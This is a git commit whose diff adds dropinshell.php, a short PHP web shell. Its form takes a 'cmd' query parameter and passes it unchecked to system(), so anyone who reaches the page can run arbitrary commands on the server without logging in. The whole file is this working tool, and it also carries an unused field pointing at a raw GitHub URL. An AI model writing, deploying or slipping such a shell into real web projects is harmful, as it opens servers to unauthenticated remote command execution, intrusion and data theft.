2351c67724b3ee0bd36ef6a236437684ddc839e7
nbernier <nicolas.bernier@perficient.com>
2022-05-20 14:32:02 -0400

    dropinshell

---
+++ dropinshell.php
@@ -0,0 +1,15 @@
+
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="TEXT" name="page" value=http://raw.githubusercontent.com/nbernier/cft/master/dropinshell">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    $TITLE="DropInShell";
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
